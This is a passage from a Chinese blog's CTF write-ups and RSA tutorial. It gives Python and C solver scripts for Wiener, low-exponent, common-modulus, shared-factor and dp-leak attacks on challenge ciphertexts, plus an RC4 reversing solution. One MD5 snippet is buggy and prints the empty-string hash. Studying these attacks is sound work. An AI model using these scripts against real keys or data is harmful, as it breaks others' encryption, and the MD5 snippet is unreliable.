Arithmeticc=37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066e=46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249n=86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289# firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !def wiener_hack(e, n): frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr &gt;= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print(&quot;Hacked!&quot;) return d return Falsed = wiener_hack(e, n)print(d)m=pow(c,d,n)flag=long_to_bytes(m)print(flag) 这边仅限于了解rsa-wiener-attack攻击的使用","link":"/2022/04/08/CTF/2020-CISCN/"},{"title":"2021CISCN","text":"复现一下2021CISCN rsa题目： 123456789101112131415161718192021222324252627282930313233343536373839from flag import text,flagimport md5from Crypto.Util.number import long_to_bytes,bytes_to_long,getPrimeassert md5.new(text).hexdigest() == flag[6:-1]msg1 = text[:xx]msg2 = text[xx:yy]msg3 = text[yy:]msg1 = bytes_to_long(msg1)msg2 = bytes_to_long(msg2)msg3 = bytes_to_long(msg3)p1 = getPrime(512)q1 = getPrime(512)N1 = p1*q1e1 = 3print pow(msg1,e1,N1)print (e1,N1)p2 = getPrime(512)q2 = getPrime(512)N2 = p2*q2e2 = 17e3 = 65537print pow(msg2,e2,N2)print pow(msg2,e3,N2)print (e2,N2)print (e3,N2)p3 = getPrime(512)q3 = getPrime(512)N3 = p3*q3print pow(msg3,e3,N3)print (e3,N3)print p3&gt;&gt;200 给出的out文件 12345678919105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893(3, 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L)5499575138725879879189541321617228465340705407976576970417076302383013098148027294333844524568929372930820057421795901846251279052362225247925841949885830789811890707677347025353334487795950876628573050906782968442737575934562370160599706713565940429666387745375870101072656182495160261550107881891441095961091290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950(17, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L)(65537, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L)59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646(65537, 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L)7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902 首先是msg1，低加密指数攻击，给c开三次方就可以解出来了，但是谨慎一点，还是使用循环爆破来解比较稳妥。 1234567891011121314from gmpy2 import irootfrom Crypto.Util import numbern = 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009c = 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893e = 0x3k = 0while 1: res=iroot(c+k*n,e) if(res[1]==True): print(number.long_to_bytes(res[0])) break k=k+1# b' \\nO wild West Wind, thou breath of Autum' 然后是msg2，共模攻击 12345678910111213141516171819202122232425262728293031323334353637383940414243import gmpy2from Crypto.Util import number#扩展欧几里得算法def exgcd(m, n, x, y): if n == 0: x = 1 y = 0 return (m, x, y) a1 = b = 1 a = b1 = 0 c = m d = n q = int(c / d) r = c % d while r: c = d d = r t = a1 a1 = a a = t - q * a t = b1 b1 = b b = t - q * b q = int(c / d) r = c % d x = a y = b return (d, x, y)c1=54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610c2=91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950e1 = 17e2 = 65537n=111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977ans=exgcd(e1,e2,0,0)s1=ans[1]s2=ans[2]#powmod()函数,分数取模也可以直接算m=(gmpy2.powmod(c1,s1,n)*gmpy2.powmod(c2,s2,n))%nprint(long_to_bytes(m))# b&quot;n's being,\\nThou, from whose unseen presence the leaves dead\\nAre driven, like ghosts from an enchanter fleeing,\\nYellow, a&quot; 最后一个倒是挺迷惑人的，给出了错误的方向，右移200位，再左移的话，和不告诉我们没有区别…… 然后，我找到了这首诗： 不知道msg3的范围，字符串循环爆破即可。 123456789101112e = 65537n = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147c = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646string = b&quot;nd black, and pale, and hectic red,\\nPestilence-stricken multitudes: O thou,\\nWho chariotest to their dark wintry bed\\n\\nThe winged seeds, where they lie cold and low,\\nEach like a corpse within its grave, until\\nThine azure sister of the Spring shall blow\\n\\nHer clarion o'er the dreaming earth, and fill\\n(Driving sweet buds like flocks to feed in air)\\nWith living hues and odours plain and hill:\\n\\nWild Spirit, which art moving everywhere;\\nDestroyer and preserver; hear, oh hear!&quot;for i in range(len(string)): fake_m = bytes_to_long(string[:i]) fake_c = pow(fake_m,e,n) if fake_c == c: print(string[:i]) break# b'nd black, and pale, and hectic red,\\nPestilence-stricken multitudes: O thou,\\nWho chariotest to their dark wintry bed\\n' python3的生成md5代码： 1234567891011import hashlibmsg1 = b' \\nO wild West Wind, thou breath of Autum'msg2 = b&quot;n's being,\\nThou, from whose unseen presence the leaves dead\\nAre driven, like ghosts from an enchanter fleeing,\\nYellow, a&quot;msg3 = b'nd black, and pale, and hectic red,\\nPestilence-stricken multitudes: O thou,\\nWho chariotest to their dark wintry bed\\n'text = msg1+msg2+msg3print(text)crypto = hashlib.md5()flag = crypto.hexdigest()print(flag)# d41d8cd98f00b204e9800998ecf8427e python2的生成md5代码： 12345import md5text = b&quot; \\nO wild West Wind, thou breath of Autumn's being,\\nThou, from whose unseen presence the leaves dead\\nAre driven, like ghosts from an enchanter fleeing,\\nYellow, and black, and pale, and hectic red,\\nPestilence-stricken multitudes: O thou,\\nWho chariotest to their dark wintry bed\\n&quot;flag = md5.new(text).hexdigest()print(flag)# 3943e8843a19149497956901e5d98639 如果比赛就一个一个的试…… glass先用jeb查看一下，直接查看没有发现任何加密函数，有点懵，然后发现上面有一个.lib文件 用jd-gui可以查看有一个so文件， 直接解压.apk文件，然后在lib-&gt; armeabi-v7a -&gt; 处找到.so文件，用ida32就能查看这个checkflag函数 可以发现是RC4加密，可以查看我之前的一个博客，还有当时参考的大佬的一篇文章 sub_FFC函数是RC4加密的准备工作，数组S的置换以及生成密钥流 在经历了标准的RC4加密后，经过了第二个加密函数，39作为二参传入加密函数 其中有两个for循环，第二个for循环根据xor的特性，照搬不动即可 第一个for循环，可以转换成以下的代码： 123data[i] = data[i] ^ data[i+2]data[i+2] = data[i+2] ^ data[i+1]data[i+1] = data[i+1] ^ data[i] 最终结果是要与unk_497C数组做对比 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void rc4_init(unsigned char*s,unsigned char*key,unsigned long len){ int i=0; int j=0; unsigned char k[256]={}; unsigned char temp = 0; for(i=0;i&lt;256;i++) { s[i]=i; //0-255赋给s k[i]=key[i%len]; //将k重新计算 } for(i=0;i&lt;256;i++) { j=(j+s[i]+k[i])%256; //给j赋值 temp=s[i]; s[i]=s[j]; s[j]=temp; //s[i]和s[j]交换 }}void rc4_crypt(unsigned char*s,unsigned char*data,unsigned long len){ int i=0,j=0,t=0; unsigned long k=0; unsigned char temp; for(k=0;k&lt;len;k++) { i=(i+1)%256; //固定方式生成的i j=(j+s[i])%256; //固定方式生成的j temp=s[i]; s[i]=s[j]; s[j]=temp; //交换s[i]和s[j] t=(s[i]+s[j])%256; //固定方式生成的t data[k]^=s[t]; //来作为s的下标和data进行异或运算 }}int main(){ unsigned char s[256]={0}; int i=0,j=0; char key[256] = &quot;12345678&quot;; unsigned char data[512]={0xA3, 0x1A, 0xE3, 0x69, 0x2F, 0xBB, 0x1A, 0x84, 0x65, 0xC2, 0xAD, 0xAD, 0x9E, 0x96, 0x05, 0x02,0x1F, 0x8E, 0x36, 0x4F, 0xE1, 0xEB, 0xAF, 0xF0, 0xEA, 0xC4, 0xA8, 0x2D, 0x42, 0xC7, 0x6E, 0x3F,0xB0, 0xD3, 0xCC, 0x78, 0xF9, 0x98, 0x3F, 0x00}; unsigned long data_len = 39; unsigned long key_len = 8; for(i=0;i&lt;39;i+=key_len) { for (j = 0; (key_len &amp; ~(key_len &gt;&gt; 31)) != j &amp;&amp; i + j &lt; 39; ++j) { data[i+j] = data[i+j] ^ key[j]; } } for(i=0;i&lt;data_len;i+=3) { //向右循环回去 data[i+1] = data[i] ^ data[i+1]; data[i+2] = data[i+1] ^ data[i+2]; data[i] = data[i+2] ^ data[i]; } rc4_init(s,(unsigned char*)key,key_len);//初始化得到s rc4_crypt(s,(unsigned char*)data,data_len);//解密 for(i=0;i&lt;39;i++) { printf(&quot;%c&quot;,data[i]); } return 0;}//CISCN{6654d84617f627c88846c172e0f4d46c} 脚本来源","link":"/2022/04/20/CTF/2021CISCN/"},{"title":"rsa合集","text":"最近好好整理了一下有关RSA的知识点,以及其在CTF比赛中的应用 基础知识数论知识在这边简单阐述rsa需要用到的数论知识： 互质关系，两个正整数除了1以外没有其他公因子，就称这两个数为互质关系（coprime） 欧拉函数:任意给定正整数n，计算小于等于n正整数中，与n构成互质关系的个数 欧拉定理: 也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104）。 关于欧拉函数的结论很多，可以去别的地方查找，但是这边只介绍两个 （1） 如果n是质数，则 φ(n)=n-1 （2） 如果n可以分解成两个互质的整数之积： n = p1 * p2 ==&gt; φ(n) = φ(p1p2) = φ(p1)φ(p2) 模反元素：如果两个正整数a和n互质，那么一定可以找到整数b，使得ab-1被n整除 比如，3和11互质，那么3的模反元素就是4，因为 (3 × 4)-1 可以被11整除。显然，模反元素不止一个， 4加减11的整数倍都是3的模反元素 {…,-18,-7,4,15,26,…}，即如果b是a的模反元素，则 b+kn 都是a的模反元素。 欧拉定理可以用来证明模范元素必然存在 rsa加密算法 随机选择两个不相等的质数p和q 计算p和q的乘积n 1n = p * q 计算n的欧拉函数φ(n) 123φ(n) = (p-1) (q-1) 推算：φ(n) = φ(p*q) = φ(p1)φ(p2) = (p-1) (q-1) 随机选择一个整数e，条件：（1&lt;e&lt;φ(n)）,且e和φ(n)互质 计算e对于φ(n)的模反元素d 12345ed ≡ 1 (mod φ(n))ed - 1 = kφ(n)ex + φ(n)y = 1，也就是求左边二元一次方程的解 将n和e扩展成公钥（n，e），n和d封装成私钥（n，d） 123假设n = 3233，e = 17，d = 2753公钥：（3233，17） 私钥（3233，2753） rsa算法的可靠性 一共出现了6个数字：p/q/φ(n)/e/d，公钥用到了两个，其余四个整数都是不公开的，其中最关键的是d，一旦d泄，就等于私钥泄露 结论：如果n可以被因数分解，d就可以被算出，也就意味这私钥被破解。除了暴力破解，还没有发现别的有效方法，目前被破解的最长RSA密钥就是768位。 加密与解密 （1） 加密需要公钥（n,e），假设m就是要加密的值，比如ascii码值或者Unicode值(m必须为整数，且小于n)，那么加密后的值为c 1m ** e ≡ c (mod n) 爱丽丝的例子，爱丽丝的公钥为(3233,17) 假设鲍勃要加密的值是65，通过下面的计算，2790就是鲍勃发送的值 165 ** 17 ≡ 2790 (mod 3233) （2） 解密需要私钥（n,d），下面的等式一定成立 1c ** d ≡ m (mod n) 还是爱丽丝的例子，爱丽丝就用自己的私钥(3233,2735)进行解密 12790 ** 2753 ≡ 65 (mod 3233) 因此，爱丽丝就知道鲍勃加密前的密文就是65 当然还有关于上述公示的证明，可以参考阮老师的博客： http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html http://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html yafu的使用最常用的方法是在命令行中直接使用factor()函数分解 1yafu-x64 factor(n) 当然，命令行可能不支持太长的n 新建一个pcat.txt，注意最后一定得换行，运行命令 1yafu-x64 “factor(@)” -batchfile pcat.txt 中国剩余定理资料参考 我来举个简单的例子来理解一下CRT的代码实现。 123456789101112131415161718192021222324import gmpy2#ai是余数，mi是除数，且除数mi互质a1,m1 = 1,3 # x % 3 == 1 a2,m2 = 3,5 # x % 5 == 3 a3,m3 = 2,7 # x % 7 == 2 # M为除数的乘积，即M = ∏ miM = m1 * m2 * m3# Mi是除了自身的除数的乘积M1 = M // m1 # M1 = 35M2 = M // m2 # M2 = 21M3 = M // m3 # M3 = 15# ti就是Mi关于mi的模逆t1 = gmpy2.invert(M1,m1) # t1 = 2 35*2 % 3 == 1t2 = gmpy2.invert(M2,m2) # t2 = 1t3 = gmpy2.invert(M3,m3) # t3 = 1# x是ai*ti*Mi项的和x = a1 * t1 * M1 + a2 * t2 * M2 + a3 * t3 * M3s = x%Mprint(s) # 163 % 105 = 58 结果不唯一，x + kM都可以是结果 所以如果是求最小值，可以x%M 上面的代码简化一下，就可以变成下面的代码： 1234567891011121314151617import gmpy2def CRT(aList, mList): M = 1 for i in mList: M = M * i #计算M = ∏ mi x = 0 for i in range(len(mList)): Mi = M // mList[i] #计算Mi ti = gmpy2.invert(Mi, mList[i]) #计算Mi的逆元 x += aList[i] * Mi * ti #构造x各项 x = x % M return xaList = [1,3,2]mList = [3,5,7]print(CRT(aList,mList)) 例题：蓝桥杯2022年python B组试题B：寻找整数 1234567891011121314151617181920import gmpy2def CRT(aList, mList): M = 1 for i in mList: M = M * i #计算M = ∏ mi #print(M) x = 0 for i in range(len(mList)): Mi = M // mList[i] #计算Mi Mi_inverse = gmpy2.invert(Mi, mList[i]) #计算Mi的逆元 x += aList[i] * Mi * Mi_inverse #构造x各项 x = x % M return xnList = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47]cList = [1,2,4,4,0, 10,0, 18,15,16,27,22,1, 11,5]print(CRT(cList,nList))# 2022040920220409 各种题型基础解法rsarsa （基础解法）123456789Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm.p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034Use RSA to find the secret message 123456789import gmpy2p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034n = p * qd = gmpy2.invert(e, (q-1)*(p-1))m = pow(c,d,n)print(m) 首先我们需要求出d，这样就使得rsa私钥被泄露 介绍一个函数gmpy2.invert()函数，专门用来求模反的函数，需要求出的d就是e关于φ(n)的模反 n = p1 * p2 ==&gt; φ(n) = φ(pq) = φ(p)φ(q) = (p - 1)(q - 1) ed ≡ 1 (mod φ(n)) 求出flag，也就是密文，c是明文（被加密之后的），需要求出求得d之后，计算 1c ** d ≡ m (mod n) 转换成代码，m = pow(c,d,n) RSAROOL (在线分解)题目给出公钥{n,e}，因式分解求p和q 12p = 18443q = 49891 当然，因式分解python代码爆破也行： 1234567891011121314151617181920import time# 对一个数进行因式分解def factorization(num): factor = [] while num &gt; 1: for i in range(num - 1): k = i + 2 if num % k == 0: factor.append(k) num = int(num / k) break return factorst = time.perf_counter()print(factorization(920139713))et = time.perf_counter()print(&quot;用时:&quot;, et - st)# [18443, 49891] 完整代码： 12345678910111213141516171819202122import gmpy2n = 920139713e = 19p = 18443q = 49891# 读取数据，需要修改一下文本文档中的值# lis = []# with open(&quot;data.txt&quot;,&quot;r&quot;) as f:# lines = f.readlines()# for line in lines:# lis.append(int(line.strip()))lis = [704796792, 752211152, 274704164, 18414022, 368270835, 483295235, 263072905, 459788476, 483295235, 459788476, 663551792, 475206804, 459788476, 428313374, 475206804, 459788476, 425392137, 704796792, 458265677, 341524652, 483295235, 534149509, 425392137, 428313374, 425392137, 341524652, 458265677, 263072905, 483295235, 828509797, 341524652, 425392137, 475206804, 428313374, 483295235, 475206804, 459788476, 306220148]flag = []for i in lis: d = gmpy2.invert(e,(p-1)*(q-1)) flag.append(chr(int(pow(i,d,n)))) # pow计算完成之后需要转成intprint(&quot;&quot;.join(flag))# flag{13212je2ue28fy71w8u87y31r78eu1e2} RSA (基础解法)12在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d作为flag提交 1234567import gmpy2p=473398607161q=4511491e=17d = gmpy2.invert(e,(p-1)*(q-1))print(d)# flag{125631357777427553} [ACTF新生赛2020]crypto-rsa0 (zip伪加密)misc zip伪加密参考链接： zip格式共有三个数据区：压缩源文件数据区/压缩源文件目录区/压缩源文件目录结束标志 第一区的第三个字节和第二区的第四个字节都显示是否加密的信息.修改两个区域的加密信息，数字是奇数时为加密，数字为偶数时，则不加密。我们修改09 00 改成08 00 winhex打开查看 修改后： 在来看这道题，放在winhex中打开，修改一下 1239018588066434206377240277162476739271386240173088676526295315163990968347022922841299128274551482926490908399237153883494964743436193853978459947060210411754700567387773825783572976003776521334003669635076632422914361317993214512213068577850406241013704363595820880569869816984729352014957260502649275174022350996206925961019415256003394743594106061473865032792073035954925875056079762626648452348856255575840166640519334862690063949316515750256545937498213476286637455803452890781264446030732369871044870359838568618176586206041055000297981733272816089806014400846392307742065559331874972274844992047849472203390350 给了上述的三串数字，猜测是p/q/n，上代码： 12345678910from Crypto.Util import numberimport gmpy2p = 9018588066434206377240277162476739271386240173088676526295315163990968347022922841299128274551482926490908399237153883494964743436193853978459947060210411q = 7547005673877738257835729760037765213340036696350766324229143613179932145122130685778504062410137043635958208805698698169847293520149572605026492751740223c = 50996206925961019415256003394743594106061473865032792073035954925875056079762626648452348856255575840166640519334862690063949316515750256545937498213476286637455803452890781264446030732369871044870359838568618176586206041055000297981733272816089806014400846392307742065559331874972274844992047849472203390350e = 65537n = p*qd = gmpy2.invert(e,(p-1)*(q-1))m = pow(c,d,n)print(number.long_to_bytes(m)) [GUET-CTF2019]BabyRSA （z3）题目给出了(p+1)(q+1)，我们用z3来解就行 上代码： 123456789101112131415161718192021from z3 import *import gmpy2from Crypto.Util.number import *e = 0xe6b1bee47bd63f615c7d0a43c529d219d = 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5c = 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9ap,q = Ints('p q')s = Solver()s.add(p + q == 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea)s.add((p+1)*(q+1) == 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740)print(s.check())print(s.model())q = 7021910101974335245794950722131367118195509913680915814438898999848788125908122655583911434165700354149914056221915541094395668546921268189522005629523759p = 8228801334907462855397256098699556584084854642543205682719705217859576250443629616812386484797164506834582095674143447181804355696220642775619711451990971n = p*qd = gmpy2.invert(e,(p-1)*(q-1))m = pow(c,d,n)print(long_to_bytes(m))# flag{cc7490e-78ab-11e9-b422-8ba97e5da1fd} [HDCTF2019]bbbbbbrsa (爆破e)题目给出了n和q，base64解码一下c，e的范围不是很大，所以直接暴力循环e就可以 12345678910111213141516171819202122import base64from Crypto.Util.number import *import gmpy2n = 37421829509887796274897162249367329400988647145613325367337968063341372726061p = 177077389675257695042507998165006460849q = n // pc = bytes(&quot;==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM&quot;[::-1],&quot;utf-8&quot;)c = int(str(base64.b64decode(c),&quot;utf-8&quot;))print(c)phi = (p-1) * (q-1)for e in range(50000,70000): if gmpy2.gcd(e,phi) != 1: continue d = gmpy2.invert(e,phi) m = pow(c,d,n) flag = str(long_to_bytes(m)) print(e,flag) if &quot;flag&quot; in flag or &quot;CTF&quot; in flag or &quot;ctf&quot; in flag: break #flag{rs4_1s_s1mpl3!#} RSA (公钥解析1)题目给出了一个key后缀文件和一个enc后缀的文件 需要进行公钥解析： 上代码： 1234567891011121314151617from Crypto.Util import numberimport gmpy2n = 86934482296048119190666062003494800588905656017203025617216654058378322103517e = 65537p = 285960468890451637935629440372639283459q = 304008741604601924494328155975272418463# with open(&quot;flag.enc&quot;,&quot;rb&quot;) as f:# s = f.read().strip()# print(number.bytes_to_long(s))c = 29666689760194689065394649908301285751747553295673979512822807815563732622178d = gmpy2.invert(e,(q-1)*(p-1))m = gmpy2.powmod(c,d,n)print(number.long_to_bytes(m)) [AFCTF2018]可怜的RSA (公钥解析2 + PKCS1_OAEP)我们也可以使用Crypto.PublicKey.RSA包中的函数来导入给出的public.key文件 123456789101112import base64from Crypto.Util.number import *import gmpy2from Crypto.PublicKey import RSAwith open(&quot;public.key&quot;,&quot;r&quot;) as f: pub = RSA.importKey(f.read()) n = pub.n e = pub.e print(n,&quot;\\n&quot;,e)# n = 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443 # e = 65537 分解n,当然可以使用在线网站 然后是从flag.ence中读取c，一开始我使用的是平常的m = pow(c,d,n)，会出错。 –正解– 打包密钥之后，使用PKCS1_OAEP填充模式来解 123456789101112131415161718192021222324from base64 import *from Crypto.Cipher import PKCS1_OAEPfrom Crypto.Util.number import *import gmpy2from Crypto.PublicKey import RSAwith open(&quot;public.key&quot;,&quot;r&quot;) as f: pub = RSA.importKey(f.read()) n = pub.n e = pub.e q = 25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939p = 3133337d = int(gmpy2.invert(e,(p-1)*(q-1)))key_info = RSA.construct((n, e, d, p, q))key = RSA.importKey(key_info.exportKey())key = PKCS1_OAEP.new(key)with open('flag.enc', 'r') as f: c = b64decode(f.read())flag = key.decrypt(c)print(flag)# afctf{R54_|5_$0_B0rin9} 模不互质当题目给出多个n，多个c，但只给出一个e，我们可以考虑模不互质攻击 q = gcd(n1,n2) ezrsa这题是将一个同一个密文，用不同的模，相同的e加密了两次 1234567891011121314import mathfrom gmpy2 import invertfrom Crypto.Util.number import *n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073e = 65537flag =c = pow(flag,e,n1)c = pow(c,e,n2)print(c)#c=89624483360276074856011726888512095222773886375935390632322243611990748676661578370812870896647725693055942461208179974507367326886187428769565464612599398828896896815588677526117803992483614423139896898597788550271683093797162530843285205405331463405761603448815504547110859369661150095379164767159123704212 123456789101112131415161718192021import mathimport gmpy2from Crypto.Util.number import *e = 65537c = 89624483360276074856011726888512095222773886375935390632322243611990748676661578370812870896647725693055942461208179974507367326886187428769565464612599398828896896815588677526117803992483614423139896898597788550271683093797162530843285205405331463405761603448815504547110859369661150095379164767159123704212n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073p = gmpy2.gcd(n1,n2)q2 = n2 // pq1 = n1 // pd1 = gmpy2.invert(e,(p-1)*(q2-1))m1 = pow(c,d1,n2)d2 = gmpy2.invert(e,(p-1)*(q1-1))m2 = pow(m1,d2,n1)print(long_to_bytes(m2))# flag{CMCTF_CRYPTO_RsA2} dp泄露RSA2 (dp泄露)题目给了个dp，也不知道是啥，继续因式分解，求p和q 其中解出来的密文m需要用Crypto.Util.number的库中long_to_bytes()函数 12345678910import gmpy2from Crypto.Util.number import *e = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751p = 13468634736343473907717969603434376212206335187555458742257940406618189481177835992217885676243155145465521141546915941147336786447889325606555333350540003q = 18432009829596386103558375461387837845170621179295293289126504231317130550979989727125205467379713835047300158256398009229511746203459540859429194971855371d = gmpy2.invert(e,(p-1)*(q-1))m = int(pow(c,d,n))print(long_to_bytes(m)) –更新– 查看 前方是否可导？大佬的博客之后才发现，dp是用来帮助n来分解p和q的，也就是可以通过dp求得p 12345678910111213141516171819202122已知：ed ≡ 1 (mod (p-1)(q-1))# d 是e关于φ(n)的模逆，所以ed = 1 mod (p-1)(q-1)# ed = k(p-1)(q-1) +1dp = d%(p-1)# d = k1*(p-1) + dp# ed = ek1(p-1) + edp所以：k2(p-1)(q-1) + ek1(p-1) + e*dp = 1两边对p-1求余：e*dp % (p-1) = 1 所以：e * dp = k(p-1) +1 # p = (e * dp - 1 / k) + 1k = (e * dp - 1)/(p - 1) = e(dp/p-1) - 1/(p-1)#所以 k &lt; e 直接引用大佬的原话： 